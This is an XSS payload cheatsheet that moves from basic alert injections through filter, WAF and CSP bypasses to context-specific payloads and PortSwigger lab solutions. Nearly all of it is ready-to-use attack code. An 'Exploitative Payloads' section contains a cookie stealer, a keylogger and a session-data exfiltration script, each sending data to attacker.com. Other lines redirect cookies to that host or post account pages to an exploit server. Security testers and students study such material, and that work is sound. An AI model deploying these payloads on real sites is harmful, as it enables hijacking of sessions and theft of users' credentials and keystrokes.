# XSS Payload Cheatsheet: Basic to Advanced

## Basic Payloads

### Alert Box Payloads
```javascript
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>alert(1)</script>
```
*Why it works:* Direct script injection executes JavaScript. Use these for initial testing or when no filters are present.

### HTML Tag Attribute Injection
```javascript
" autofocus onfocus="alert(document.domain)
" onmouseover="alert(document.domain)
"><script>alert(document.domain)</script>
```
*Why it works:* Breaks out of an attribute context (like `value="user-input"`) and injects new attributes or tags.

### Image Tag Payloads
```javascript
<img src=x onerror=alert(document.domain)>
<img src=invalid onerror=alert(document.cookie)>
<img src="javascript:alert(document.domain)">
```
*Why it works:* The `onerror` event triggers when the image fails to load. Useful when `<script>` tags are blocked.

### SVG Tag Payloads
```javascript
<svg onload=alert(document.domain)>
<svg><script>alert(document.domain)</script></svg>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
```
*Why it works:* SVG tags can execute JavaScript and may bypass filters that only block standard HTML tags.

## Intermediate Payloads

### Event Handler Variations
```javascript
<body onload=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<iframe onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<audio src=x onerror=alert(document.domain)>
```
*Why it works:* Different HTML elements have various event handlers. Try these when specific tags or events are blocked.

### JavaScript URI Payloads
```javascript
<a href="javascript:alert(document.domain)">Click me</a>
<iframe src="javascript:alert(document.domain)"></iframe>
<object data="javascript:alert(document.domain)">
<form action="javascript:alert(document.domain)"><button>Submit</button></form>
```
*Why it works:* Uses the JavaScript URI protocol which executes code when clicked or loaded.

### Bypassing Basic Filters

#### Script Tag Variations
```javascript
<script>alert(document.domain)</script>
<ScRiPt>alert(document.domain)</ScRiPt>
<script >alert(document.domain)</script>
<script/x>alert(document.domain)</script>
```
*Why it works:* Many basic filters only check for lowercase `<script>` without accounting for case sensitivity or spaces.

#### Encoded Payloads
```javascript
%3Cscript%3Ealert(document.domain)%3C/script%3E  // URL encoded
&#60;script&#62;alert(document.domain)&#60;/script&#62;  // HTML entity encoded
\x3Cscript\x3Ealert(document.domain)\x3C/script\x3E  // Hex encoded
```
*Why it works:* Bypasses filters that look for specific strings without decoding the input first.

### DOM-Based XSS Payloads

#### For location.hash (URL Fragment)
```javascript
// Visit: https://example.com/page#<img src=x onerror=alert(document.domain)>
// Code that creates vulnerability: document.write(location.hash)
```

#### For document.referrer
```javascript
// Setup a page that refers to the target with a malicious URL
// Code that creates vulnerability: document.write(document.referrer)
```

#### For innerHTML
```javascript
// Code vulnerability: element.innerHTML = userInput
"><img src=x onerror=alert(document.domain)>
```

## Advanced Payloads

### JavaScript Context Payloads
```javascript
// For: var data = "USER-INPUT";
";alert(document.domain);//

// For: var data = 'USER-INPUT';
';alert(document.domain);//

// For: var data = `USER-INPUT`;
`;alert(document.domain);//

// For: var data = /USER-INPUT/;
/alert(document.domain)/
```
*Why it works:* Breaks out of JavaScript string, template literal, or regex contexts and injects code.

### JSON Context Payloads
```javascript
// For data in JSON being processed with eval():
{"key":"value","x":"; alert(document.domain); //"}
```
*Why it works:* Exploits insecure JSON handling where user content isn't properly sanitized before processing.

### Content Security Policy (CSP) Bypasses

#### Using Allowed Source
```javascript
// If script-src 'self' https://trusted-cdn.com is allowed:
<script src="https://trusted-cdn.com/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(document.domain)')()}}</div>
```
*Why it works:* Exploits legitimate scripts from allowed domains that can execute arbitrary code.

#### Using DOM Data Exfiltration
```javascript
// Even with strict CSP, you can leak data:
<script>
location='https://attacker.com/?stolen='+document.cookie
</script>
```
*Why it works:* Redirects to an attacker-controlled site, leaking sensitive information in the URL.

### XSS in Unusual Contexts

#### XSS in Markdown
```
[Click me](javascript:alert(document.domain))
<img src=x onerror=alert(document.domain)>
```
*Why it works:* Many markdown parsers allow certain HTML tags or don't properly sanitize URLs.

#### XSS in XML
```xml
<xml>
<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(document.domain)</a:script>
</xml>
```
*Why it works:* XML namespaces can be used to create cross-namespace scripting attacks.

#### XSS in SVG Files
```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.domain)</script>
</svg>
```
*Why it works:* SVG files can contain script tags and are often uploaded as images.

## Expert-Level Payloads

### Dangling Markup Injection
```html
<img src='https://attacker.com/
```
*Why it works:* Causes everything after injection until the next quote to be sent to attacker's server.

### Advanced Filter Bypasses

#### Without Parentheses
```javascript
<script>onerror=alert;throw 1</script>
<script>throw onerror=alert,1</script>
```
*Why it works:* Executes alert without using parentheses when they're filtered.

#### Without Spaces
```javascript
<svg/onload=alert(1)>
<svg/onload=alert&#40;1&#41;>
```
*Why it works:* Uses alternative syntax that doesn't require spaces.

#### Self-Executing Functions
```javascript
<img src=x onerror=(()=>{alert(document.domain)})()>
```
*Why it works:* Uses arrow functions for more compact code execution.

### Exploitative Payloads

#### Cookie Stealer
```javascript
<script>
fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie))
</script>
```
*Why it works:* Sends cookies to attacker-controlled server.

#### Keylogger
```javascript
<script>
document.addEventListener('keypress',function(e){
  fetch('https://attacker.com/log?key='+e.key)
});
</script>
```
*Why it works:* Captures and sends keystrokes to attacker-controlled server.

#### Session Takeover
```javascript
<script>
fetch('/api/user/profile')
.then(r=>r.json())
.then(data=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(data))))
</script>
```
*Why it works:* Fetches sensitive data and sends it to an attacker-controlled server.

## PortSwigger-Specific Payloads

### Lab-Optimized Payloads
```javascript
// For admin exploit server labs:
<script>
fetch('/admin/delete?username=carlos', {credentials: 'include'})
</script>

// For data exfiltration labs:
<script>
fetch('/my-account')
.then(r=>r.text())
.then(t=>fetch('https://EXPLOIT-SERVER-ID.exploit-server.net/log?data='+encodeURIComponent(t)))
</script>
```
*Why it works:* Specifically crafted to solve PortSwigger labs that require CSRF attacks against admin users.

### Polyglot XSS (Works in Multiple Contexts)
```javascript
javascript:"/*\"/*`/*' /*</template></textarea></noscript></style></title></script>--><svg/onload=/*<html/*/onmouseover=alert()//>
```
*Why it works:* Designed to work across various contexts by breaking out of multiple potential enclosures.

### WAF/Filter Bypass Collection
```javascript
// When alert() is blocked:
<img src=x onerror=prompt(document.domain)>
<img src=x onerror=console.log(document.domain)>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

// When lowercase event handlers are blocked:
<img src=x OnError=alert(document.domain)>
<IMG SRC=x onERROR=alert(document.domain)>
```
*Why it works:* Uses alternative functions or encoding to bypass specific keyword filters.

## Context-Specific Cheatsheet

### Context: HTML Element Content
**Vulnerable pattern:** `<div>USER-INPUT</div>`  
**Payloads:**
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

### Context: HTML Attribute
**Vulnerable pattern:** `<input value="USER-INPUT">`  
**Payloads:**
```javascript
" autofocus onfocus="alert(document.domain)
" onmouseover="alert(document.domain)
"><script>alert(document.domain)</script>
```

### Context: JavaScript String
**Vulnerable pattern:** `<script>var name = "USER-INPUT";</script>`  
**Payloads:**
```javascript
";alert(document.domain);//
\";alert(document.domain);//
</script><script>alert(document.domain)</script>
```

### Context: JavaScript Template Literal
**Vulnerable pattern:** `<script>var name = `USER-INPUT`;</script>`  
**Payloads:**
```javascript
${alert(document.domain)}
`;alert(document.domain);//
```

### Context: URL Parameter
**Vulnerable pattern:** `<a href="/page?param=USER-INPUT">`  
**Payloads:**
```javascript
javascript:alert(document.domain)
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
```

### Context: Style
**Vulnerable pattern:** `<style>selector { property: USER-INPUT; }</style>`  
**Payloads:**
```javascript
</style><script>alert(document.domain)</script>
</style><img src=x onerror=alert(document.domain)>
```
